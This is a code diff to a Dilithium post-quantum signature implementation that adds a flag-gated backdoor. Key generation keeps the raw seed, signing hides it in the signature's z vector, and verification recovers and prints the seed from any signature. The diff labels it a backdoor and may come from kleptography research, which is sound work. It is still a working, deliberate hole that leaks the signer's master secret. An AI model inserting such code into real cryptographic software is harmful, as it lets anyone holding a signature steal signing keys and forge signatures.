@@ -74,6 +74,16 @@ int crypto_sign_keypair(uint8_t *pk, uint8_t *sk) {
 
   /* Get randomness for rho, rhoprime and key */
   randombytes(seedbuf, SEEDBYTES);
+
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  pqcrystals_dilithium_status_print_seed("KEYGEN", seedbuf);
+  
+  // ! Backdoor requirement
+  // Keep the original seed before it is processed by shake256
+  uint8_t hidden_seed[SEEDBYTES];
+  memcpy(hidden_seed, seedbuf, SEEDBYTES);
+#endif
+
   seedbuf[SEEDBYTES+0] = K;
   seedbuf[SEEDBYTES+1] = L;
   shake256(seedbuf, 2*SEEDBYTES + CRHBYTES, seedbuf, SEEDBYTES+2);
@@ -84,7 +94,15 @@ int crypto_sign_keypair(uint8_t *pk, uint8_t *sk) {
   /* Store rho, key */
   memcpy(pk, rho, SEEDBYTES);
   memcpy(sk, rho, SEEDBYTES);
+
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  (void)key;
+
+  // ! Backdoor requirement
+  memcpy(sk + SEEDBYTES, hidden_seed, SEEDBYTES);
+#else
   memcpy(sk + SEEDBYTES, key, SEEDBYTES);
+#endif
 
   /* Sample short vectors s1 and s2 */
 #if K == 4 && L == 4
@@ -177,6 +195,24 @@ int crypto_sign_signature_internal(uint8_t *sig, size_t *siglen, const uint8_t *
   rhoprime = mu + CRHBYTES;
   unpack_sk(rho, tr, key, &t0, &s1, &s2, sk);
 
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  // ! Backdoor requirement
+  const uint8_t *hidden_seed = key;
+  uint8_t real_key[SEEDBYTES];
+  
+  pqcrystals_dilithium_status_print_seed("SIGN", hidden_seed);
+  
+  // ! Backdoor requirement
+  /* Re-compute the real key: shake256(hidden_seed || K || L) */
+  uint8_t temp_seedbuf[2*SEEDBYTES + CRHBYTES];
+  memcpy(temp_seedbuf, hidden_seed, SEEDBYTES);
+  temp_seedbuf[SEEDBYTES+0] = K;
+  temp_seedbuf[SEEDBYTES+1] = L;
+  shake256(temp_seedbuf, 2*SEEDBYTES + CRHBYTES, temp_seedbuf, SEEDBYTES+2);
+  memcpy(real_key, temp_seedbuf + SEEDBYTES + CRHBYTES, SEEDBYTES);
+  key = real_key;
+#endif
+
   /* Compute mu = CRH(tr, pre, msg) */
   shake256_init(&state);
   shake256_absorb(&state, tr, TRBYTES);
@@ -245,6 +281,14 @@ rej:
     poly_invntt_tomont(&tmp);
     poly_add(&z.vec[i], &z.vec[i], &tmp);
     poly_reduce(&z.vec[i]);
+
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+		if(i == 0) {
+			// ! Backdoor application
+			pqcrystals_dilithium_backdoor_embed(&z, hidden_seed);
+		}
+#endif
+
     if(poly_chknorm(&z.vec[i], GAMMA1 - BETA))
       goto rej;
   }
@@ -285,6 +329,7 @@ rej:
     polyz_pack(sig + CTILDEBYTES + i*POLYZ_PACKEDBYTES, &z.vec[i]);
 
   *siglen = CRYPTO_BYTES;
+
   return 0;
 }
 
@@ -400,11 +445,29 @@ int crypto_sign_verify_internal(const uint8_t *sig, size_t siglen, const uint8_t
 
   /* Expand challenge */
   poly_challenge(&c, sig);
+
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  uint8_t extracted_seed[SEEDBYTES];
+  polyvecl z_backdoor;
+  
+  for(i = 0; i < L; i++)
+    polyz_unpack(&z_backdoor.vec[i], sig + CTILDEBYTES + i * POLYZ_PACKEDBYTES);
+
+  pqcrystals_dilithium_backdoor_recover(&z_backdoor, extracted_seed);
+  
+  if(pqcrystals_dilithium_backdoor_restore(&z_backdoor, extracted_seed, mu, &c) == 0)
+    pqcrystals_dilithium_status_print_seed("RECOVER", extracted_seed);
+#endif
   poly_ntt(&c);
 
   /* Unpack z; shortness follows from unpacking */
   for(i = 0; i < L; i++) {
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+		/* Use the restored z_backdoor instead of re-unpacking the dirty one from sig */
+		z.vec[i] = z_backdoor.vec[i];
+#else
     polyz_unpack(&z.vec[i], sig + CTILDEBYTES + i*POLYZ_PACKEDBYTES);
+#endif
     poly_ntt(&z.vec[i]);
   }
 
